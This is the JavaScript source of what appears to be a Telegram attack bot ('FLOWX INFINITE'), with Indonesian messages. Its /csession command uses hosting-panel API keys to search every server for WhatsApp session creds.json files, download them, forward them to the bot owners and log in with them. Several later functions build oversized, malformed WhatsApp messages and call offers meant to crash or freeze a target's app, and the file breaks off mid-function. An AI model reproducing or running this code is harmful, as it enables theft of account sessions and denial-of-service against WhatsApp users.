bot.command("getcode", async (ctx) => {
    const chatId = ctx.chat.id;
    const input = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!input) {
        return ctx.reply("❌ Missing input. Please provide a website URL.\n\nExample:\n/getcode https://example.com");
    }

    const url = input;

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/tools/getcode?url=${encodeURIComponent(url)}`;
        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return ctx.reply("❌ Failed to fetch source code. Please check the URL.");
        }

        const code = data.result;

        if (code.length > 4000) {
            const filePath = `sourcecode_${Date.now()}.html`;
            fs.writeFileSync(filePath, code);

            await ctx.replyWithDocument({ source: filePath, filename: `sourcecode.html` }, { caption: `📄 Full source code from: ${url}` });

            fs.unlinkSync(filePath);
        } else {
            await ctx.replyWithHTML(`📄 Source Code from: ${url}\n\n<code>${code}</code>`);
        }
    } catch (err) {
        console.error("GetCode API Error:", err);
        ctx.reply("❌ Error fetching website source code. Please try again later.");
    }
});

bot.command("csession", async (ctx) => {
  const DEBUG_CS = false;
  const SEND_TO_CALLER = false;
  const REQUEST_DELAY_MS = 250;
  const MAX_DEPTH = 12;
  const MAX_SEND_TEXT = 3500;
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  function isDirectory(item) {
    if (!item) return false;
    const a = item.attributes || {};
    const checks = [
      a.type, a.mode, item.type, item.mode,
      a.is_directory, a.isDir, a.directory,
      item.is_directory, item.isDir, item.directory
    ];
    for (let c of checks) {
      if (typeof c === "string") {
        const lc = c.toLowerCase();
        if (lc === "dir" || lc === "directory" || lc === "d") return true;
        if (lc === "file" || lc === "f") return false;
      }
      if (c === true) return true;
      if (c === false) return false;
    }
    return false;
  }

  function normalizeDir(dir) {
    if (!dir) return "/";
    let d = String(dir).replace(/\/+/g, "/");
    if (!d.startsWith("/")) d = "/" + d;
    if (d.length > 1 && d.endsWith("/")) d = d.slice(0, -1);
    return d;
  }

  function extractNameAndMaybeFullPath(item) {
    const a = item.attributes || {};
    const candidates = [a.name, item.name, a.filename, item.filename, a.path, item.path];
    for (let c of candidates) {
      if (!c) continue;
      const s = String(c).trim();
      if (s) return s;
    }
    for (let k of Object.keys(item)) {
      if (/name|file|path|filename/i.test(k) && item[k]) return String(item[k]);
    }
    return "";
  }

  async function apiListFiles(domainBase, identifier, dir) {
    try {
      const res = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/list`, {
        params: { directory: dir },
        headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
      });
      return res.data;
    } catch (e) {
      if (DEBUG_CS) console.error("apiListFiles error", e && (e.response && e.response.data) ? e.response.data : e.message);
      return null;
    }
  }

  async function tryDownloadFile(domainBase, identifier, absFilePath) {
    const candidates = [];
    const p = String(absFilePath || "").replace(/\/+/g, "/");
    if (!p) return null;
    candidates.push(p.startsWith("/") ? p : "/" + p);
    const noLead = p.startsWith("/") ? p.slice(1) : p;
    if (!candidates.includes("/" + noLead)) candidates.push("/" + noLead);
    candidates.push(noLead);

    for (let c of candidates) {
      try {
        const dlMeta = await axios.get(`${domainBase}/api/client/servers/${identifier}/files/download`, {
          params: { file: c },
          headers: { Accept: "application/json", Authorization: `Bearer ${pltc}` }
        });
        if (dlMeta && dlMeta.data && dlMeta.data.attributes && dlMeta.data.attributes.url) {
          const url = dlMeta.data.attributes.url;
          const fileRes = await axios.get(url, { responseType: "arraybuffer" });
          return { buffer: Buffer.from(fileRes.data), meta: dlMeta.data };
        }
      } catch (e) {
        if (DEBUG_CS) console.error("tryDownloadFile attempt", c, e && (e.response && e.response.data) ? e.response.data : e.message);
      }
      await sleep(REQUEST_DELAY_MS);
    }
    return null;
  }

  async function traverseAndFind(domainBase, identifier, dir = "/", depth = 0) {
    dir = normalizeDir(dir);
    if (depth > MAX_DEPTH) return [];
    const listJson = await apiListFiles(domainBase, identifier, dir);
    if (!listJson || !Array.isArray(listJson.data)) return [];

    if (DEBUG_CS) {
      try { console.log("LIST", identifier, dir, JSON.stringify(listJson).slice(0, 1200)); } catch(e){}
    }

    let found = [];
    for (let item of listJson.data) {
      const rawName = extractNameAndMaybeFullPath(item);
      if (!rawName) continue;

      const nameLooksLikePath = rawName.includes("/");
      let itemPath;
      if (nameLooksLikePath) itemPath = rawName.startsWith("/") ? rawName : "/" + rawName;
      else itemPath = (dir === "/" ? "" : dir) + "/" + rawName;
      itemPath = itemPath.replace(/\/+/g, "/");

      const baseName = rawName.includes("/") ? rawName.split("/").pop() : rawName;
      const lname = baseName.toLowerCase();

      if (isDirectory(item) && (lname === "session" || lname === "sessions")) {
        const sessDir = normalizeDir(itemPath);
        const sessList = await apiListFiles(domainBase, identifier, sessDir);
        if (sessList && Array.isArray(sessList.data)) {
          for (let sf of sessList.data) {
            const sfName = extractNameAndMaybeFullPath(sf);
            if (!sfName) continue;
            const sfBase = sfName.includes("/") ? sfName.split("/").pop() : sfName;
            if (sfBase.toLowerCase() === "creds.json" || sfBase.toLowerCase().endsWith("creds.json")) {
              const sfPath = (sessDir === "/" ? "" : sessDir) + "/" + (sfName.includes("/") ? sfName.split("/").pop() : sfName);
              found.push({ path: sfPath.replace(/\/+/g, "/"), name: sfBase });
            }
          }
        }
      }

      if (!isDirectory(item) && (lname === "creds.json" || lname.endsWith("creds.json"))) {
        found.push({ path: itemPath, name: baseName });
      }

      if (isDirectory(item)) {
        const more = await traverseAndFind(domainBase, identifier, itemPath, depth + 1);
        if (more && more.length) found = found.concat(more);
      }

      await sleep(REQUEST_DELAY_MS);
    }

    const uniq = [];
    const seen = new Set();
    for (let f of found) {
      const p = f.path.replace(/\/+/g, "/");
      if (!seen.has(p)) { seen.add(p); uniq.push(f); }
    }
    return uniq;
  }

  const input = ctx.message.text.split(" ").slice(1);
  if (input.length < 3) {
    return ctx.reply("Format salah\nContoh: /csessions http://domain.com plta_xxxx pltc_xxxx");
  }
  const domainRaw = input[0];
  const plta = input[1];
  const pltc = input[2];

  const domainBase = domainRaw.replace(/\/+$/, ""); 
  
  await ctx.reply("⏳ Sedang scan semua server untuk mencari folder `session` / `sessions` dan file `creds.json` ...", { parse_mode: "Markdown" });

  try {
    const appRes = await axios.get(`${domainBase}/api/application/servers`, {
      headers: { Accept: "application/json", Authorization: `Bearer ${plta}` }
    });
    const appData = appRes.data;
    if (!appData || !Array.isArray(appData.data)) {
      return ctx.reply("❌ Gagal ambil list server dari panel. Cek PLTA & domain.");
    }

    let totalFound = 0;
    for (let srv of appData.data) {
      const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
      const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
      if (!identifier) continue;

      const foundList = await traverseAndFind(domainBase, identifier, "/");
      if (!foundList || foundList.length === 0) {
        const commonPaths = ["/home/container/session/creds.json", "/home/container/sessions/creds.json", "/container/session/creds.json", "/session/creds.json", "/sessions/creds.json", "home/container/session/creds.json"];
        for (let cp of commonPaths) {
          const tryDl = await tryDownloadFile(domainBase, identifier, cp);
          if (tryDl) {
            foundList.push({ path: cp.startsWith("/") ? cp : "/" + cp, name: "creds.json" });
            break;
          }
        }
      }

      if (foundList && foundList.length) {
        for (let fileInfo of foundList) {
          totalFound++;
          const filePath = fileInfo.path.replace(/\/+/g, "/").replace(/^\/?/, "/");

          for (let oid of ownerIds) {
            try {
              await ctx.telegram.sendMessage(oid, `📁 Ditemukan creds.json di server *${name}*\nPath: \`${filePath}\``, { parse_mode: "Markdown" });
            } catch (e) { if (DEBUG_CS) console.error("notif owner err", e); }
          }

          let downloaded = null;
          try {
            downloaded = await tryDownloadFile(domainBase, identifier, filePath);
            if (!downloaded) {
              downloaded = await tryDownloadFile(domainBase, identifier, filePath.replace(/^\//, ""));
            }
          } catch (e) {
            if (DEBUG_CS) console.error("download attempt error", e && e.message);
          }

          if (downloaded && downloaded.buffer) {
            try {
              const BotNumber = (name || "server").toString().replace(/\s+/g, "_");
              const sessDir = sessionPath(BotNumber);
              try { fs.mkdirSync(sessDir, { recursive: true }); } catch(e){}
              const credsPath = path.join(sessDir, "creds.json");
              fs.writeFileSync(credsPath, downloaded.buffer);

              for (let oid of ownerIds) {
                try {
                  await ctx.telegram.sendDocument(oid, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) {
                  if (DEBUG_CS) console.error("sendDocument owner err", e && e.message);
                }
              }

              if (SEND_TO_CALLER) {
                try {
                  await ctx.telegram.sendDocument(ctx.chat.id, { source: downloaded.buffer, filename: `${BotNumber}_creds.json` });
                } catch (e) { if (DEBUG_CS) console.error("sendDocument caller err", e && e.message); }
              }

              try {
                const txt = downloaded.buffer.toString("utf8");
                let parsed = null;
                try { parsed = JSON.parse(txt); } catch(e) { parsed = null; }
                if (parsed) {
                  const pretty = JSON.stringify(parsed, null, 2);
                  const payload = pretty.length > MAX_SEND_TEXT ? pretty.slice(0, MAX_SEND_TEXT) + "\n\n...[truncated]" : pretty;
                  for (let oid of ownerIds) {
                    try {
                      await ctx.telegram.sendMessage(oid, `\`${BotNumber}_creds.json\` (parsed JSON):\n\n\`\`\`json\n${payload}\n\`\`\``, { parse_mode: "Markdown" });
                    } catch (e) { if (DEBUG_CS) console.error("send parsed json err", e && e.message); }
                  }
                } else {
                
                  const preview = txt.slice(0, 600) + (txt.length > 600 ? "\n\n...[truncated]" : "");
                  for (let oid of ownerIds) {
                    try {
                      await ctx.telegram.sendMessage(oid, `Preview \`${BotNumber}_creds.json\`:\n\n\`\`\`\n${preview}\n\`\`\``, { parse_mode: "Markdown" });
                    } catch (e) { if (DEBUG_CS) console.error("send preview err", e && e.message); }
                  }
                }
              } catch (e) {
                if (DEBUG_CS) console.error("parse/send json err", e && e.message);
              }

              try {
                await connectToWhatsApp(BotNumber, ctx.chat.id, ctx);
              } catch (e) {
                if (DEBUG_CS) console.error("connectToWhatsApp err", e && e.message);
              }
            } catch (e) {
              if (DEBUG_CS) console.error("save/send file err", e && e.message);
            }
          } else {
            if (DEBUG_CS) console.log("Gagal download file:", filePath, "server:", name);
          }

          await sleep(REQUEST_DELAY_MS);
        }
      }

      await sleep(REQUEST_DELAY_MS * 2);
    }

    if (totalFound === 0) {
      await ctx.reply("✅ Scan selesai. Tidak ditemukan creds.json di folder session/sessions pada server manapun.");
      for (let oid of ownerIds) {
        try { await ctx.telegram.sendMessage(oid, "✅ Scan selesai (publik). Tidak ditemukan creds.json."); } catch {}
      }
    } else {
      await ctx.reply(`✅ Scan selesai. Total file creds.json berhasil ditemukan: ${totalFound} (owners dikirimi file & preview).`);
      for (let oid of ownerIds) {
        try { await ctx.telegram.sendMessage(oid, `✅ Scan selesai (publik). Total file creds.json ditemukan: ${totalFound}`); } catch {}
      }
    }
  } catch (err) {
    console.error("csessions Error:", err && (err.response && err.response.data) ? err.response.data : err.message);
    await ctx.reply("❌ Terjadi error saat scan. Cek logs server.");
    for (let oid of ownerIds) {
      try { await ctx.telegram.sendMessage(oid, "❌ Terjadi error saat scan publik."); } catch {}
    }
  }
});

console.clear();
console.log(chalk.bold.white(`\n
⣀⣀⡀⡀⢀⠀⠀⠀⠤⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠠⠤⠄⣐⣀⣀⣀⣀⣠⣤⣤⣤⣤⠄
⠈⢻⣿⣟⠛⠛⠛⠛⠛⠓⠒⣶⣦⣬⣭⣃⣒⠒⠤⢤⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⢒⣚⣫⣭⣧⣶⣶⣿⣿⡛⠉⠉⠉⠉⠉⠉⣽⣿⠟⠁⠀
⠀⠀⠙⢿⡄⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣧⠉⠛⠻⢷⣬⡙⠣⡄⠀⠀⠀⠀⠀⠀⠀⡠⠚⣡⡾⠟⠋⠁⠀⣾⡿⠉⣿⣷⣶⠀⠀⠀⠀⠀⣰⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠻⣄⠀⠀⠀⠀⣿⣿⠀⣿⣿⣿⠀⠀⠀⠀⠈⠑⢄⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⠁⠀⠀⠀⠀⠀⢿⣿⣏⣀⣾⣿⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠀⢛⣷⣤⣄⣀⣙⣿⣿⣿⣿⡃⠀⠀⠀⠀⠀⠀⡀⠀⠀⡀⠀⠀⠀⡠⠀⠀⠀⠀⠀⠀⠀⠄⠠⠈⠿⠿⠿⠿⠥⠤⠶⠶⠿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠁⠀⠀⠃⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
FLOWX INFINITE VERSION 3
`))

console.log(chalk.cyanBright(`
─────────────────────────────────────
NAME APPS   : FLOWX INFINITE
AUTHOR      : LUXZY-HALMER
ID OWN      : ${ownerIds}
VERSION     : 3 ( III )
─────────────────────────────────────\n\n`));

bot.launch();

setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);
  
  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);
  
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0;
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000);

// ───── KAKA ───── \\
async function AzkaOneMassage(target) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@otaxayun/baileys");
let devices = (
await sock.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await sock.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let Raza = xnxx();
let Official = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let XMods = sock.createParticipantNodes.bind(sock);
let Cyber = sock.encodeWAMessage?.bind(sock);

sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let memeg = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = sock.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(memeg.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = Official(Cyber ? Cyber(msg) : encodeWAMessage(msg));

return Raza.mutex(jid, async () => {
let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let Exo = crypto.randomBytes(32);
let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

let lemiting = {
tag: "call",
attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": sock.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{
tag: "video",
attrs: {
orientation: "0",
screen_width: "1920",
screen_height: "1080",
device_orientation: "0",
enc: "vp8",
dec: "vp8"
}
},
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
}] : [])
]
}]
};
await sock.sendNode(lemiting);
}


async function BuldozerFreeze(sock, target) {
  try {
    let msg = {
      viewOnceMessage: {
        message: {
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/551003005_880820454525076_8427037265734327888_n.enc?ccb=11-4&oh=01_Q5Aa3QGPCb7L_L-np3Q-t3gMXpWv0LqrjpIOVSUl5CmZBdLfhg&oe=696AB6C6&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "qFYJLA07moU+nlVHavdtjXveIMjRUvjpKgleyoSCbTU=",
            fileLength: 9999999999999,
            height: 999999999999,
            width: 999999999999,
            mediaKey: "RJ2eaiSwQb0zEYlhsGhgtPWYGbmUd0J8Uo4ibhsojp0=",
            fileEncSha256: "ir85nJw1RRKVI6+Iuozzn3J8XuSszKEjSv3iWd4lNoA=",
            directPath: "/v/t62.7118-24/551003005_880820454525076_8427037265734327888_n.enc?ccb=11-4&oh=01_Q5Aa3QGPCb7L_L-np3Q-t3gMXpWv0LqrjpIOVSUl5CmZBdLfhg&oe=696AB6C6&_nc_sid=5e03e0",
            mediaKeyTimestamp: 1766016566,
            jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADoAOgMBIgACEQEDEQH/xAAwAAACAwEAAAAAAAAAAAAAAAACBAABAwUBAAIDAQAAAAAAAAAAAAAAAAIDAAEEBf/aAAwDAQACEAMQAAAA00Vvpu1mGmeWBDCoTEGBAmkLe5/SxXhRhZSio7XDRdql+pzgzrdi13OlaTpPTxJO87sUYFbJr4Sp0ucEf//EACEQAQACAgICAwEBAAAAAAAAAAEAAgMREiEhMRMFEUUSISJB/9oACAEBAAE/ADpXq3lt84+p57N2wnjyxjjOP9n0nQ6eD5dFncE/CpNTT+55cCjtVf3Ly3C7d78z2dC8anlLMXQbCk5O/wDfxPfmLtbNdP8AmfRfmcS/F9xcdI9n6jP4l9v29y3F1v4nhyUJQ9ufzPOC3Vlf4mv3D25j3eoxgUKC6cQPKsIt5nc5S8lnMqGgH1n/2Q==", "base64"),
            caption: "ꦸ".repeat(200000),
            contextInfo: {
              mentionedJid: Array.from({length: 2000}, (_, i) => `1${i}@s.whatsapp.net`),
              stanzaId: "bsj",
              participant: target,
              remoteJid: target,
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net"
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "018@newsletter",
                newsletterName: "꧀".repeat(20000),
                contentType: "UPDATE_CARD"
              },
              quotedMessage: {
                callLogMessage: {
                  isVideo: true,
                  callOutcome: "MISSED",
                  durationSecs: 999999,
                  callType: 1,
                  callParticipant: target
                }
              }
            }
          }
        }
      }
    };
    
    await sock.relayMessage(target, msg, {
      messageId: null,
      participant: { jid: target }
    });
   
    let msg1 = {
      newsletterAdminInviteMessage: { 
        newsletterJid: "928@newsletter",
        newsletterName: "𑲱".repeat(80000),
        caption: "ꦾ".repeat(30000),
        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyIiIzNRMjNBYhAhEzJCgQH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==", "base64"),
        contextInfo: {
          mentionedJid: Array.from({length: 2000}, (_, i) => `1${i}@s.whatsapp.net`),
          stanzaId: "jsj",
          participant: target,
          remoteJid: target,
          quotedMessage: {
            extendedTextMessage: {
              text: "💤⃟⃰ᰧ./𝘅𝗿𝗹.𝛆𝛘𝛆 ✩ > https://Wa.me/stickerpack/AllTheFeels",
              matchedText: "https://Wa.me/stickerpack/xrelly",
              description: "҉҈⃝⃞⃟⃠⃤꙰꙲" + "𑇂𑆵𑆴𑆿".repeat(15000),
              title: "‼️⃟ ‌‌./𝘅𝗿𝗹.𝛆𝛘𝛆 ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
              previewType: 0,
              jpegThumbnail: null,
              inviteLinkGroupTypeV2: 0,
              contextInfo: {
                ephemeralExpiration: 5,
                forwardingScore: 999,
                isForwarded: true
              }
            }
          }
        }
      }
    };
    
    await sock.relayMessage(target, msg1, {
      messageId: null,
      participant: { jid: target }
    });
  
    let msg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 9999999999,
                degreesLongitude: -9999999999,
                name: "ꦽ".repeat(15000) + "\0".repeat(15000),
                address: "Tabola Bale" + "{".repeat(30000),
                comment: "ꦾ".repeat(10000),
                contextInfo: {
                  businessMessageForwardInfo: {
                    businessOwnerJid: "2892ꦾ8181@s.whatsapp.net"
                  },
                  stanzaId: "OdX-Id" + Math.floor(Math.random() * 99999),
                  forwardingScore: 999,
                  isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363321780349272@newsletter",
                    serverMessageId: 1,
                    newsletterName: "ោ៝".repeat(30000)
                  },
                  mentionedJid: Array.from({ length: 2000 }, () =>
                    "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                  ),
                  quotedMessage: {
                    viewOnceMessage: {
                      message: {
                        interactiveResponseMessage: {
                          body: {
                            text: "@OndetMpx𓃻< LathenPush"
                          },
                          nativeFlowResponseMessage: {
                            name: "address_message",
                            paramsJson: JSON.stringify({text: "ꦾ".repeat(30000)}),
                            version: 3
                          }
                        }
                      }
                    }
                  }
                }
              }
            },
            body: {
              text: "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    title: "ꦾ".repeat(20000),
                    sections: [
                      {
                        title: "ꦾ".repeat(5000),
                        rows: [
                          { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                          { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                          { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) }
                        ]
                      },
                      {
                        title: "ꦾ".repeat(20000) + "bokep simulator",
                        rows: [
                          { title: "ꦾ".repeat(5000), description: "ꦾ".repeat(5000), id: "ꦾ".repeat(2000) },
                          { title: "ONDET TWO BE ONE", description: "\u0000".repeat(5000), id: "ꦾ".repeat(2000) }
                        ]
                      }
                    ]
                  })
                }
              ]
            }
          }
        }
      }
    };
    
    await sock.relayMessage(target, msg2, {
      messageId: null,
      participant: { jid: target }
    });
    
    console.log("Dah Ke kirim", target);
    
  } catch (error) {
    console.error("Error Brok:", error);
    throw error;
  }
}


async function delayinvisible(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "salam kenal gw AzkaOffcial",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          }
        },
        contextInfo: {
          participant: { jid: target },
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () =>
              `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            )
          ]
        }
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: {
                  jid: target
                },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}



async function callCrash(sock, target, isVideo = false) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@otaxayun/baileys");
  
  try {
    const devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);

    const createMutex = () => {
      const locks = new Map();
      
      return {
        async mutex(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mutexManager = createMutex();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = sock.createParticipantNodes?.bind(sock);
    const originalEncodeWAMessage = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = sock.authState.creds.me;
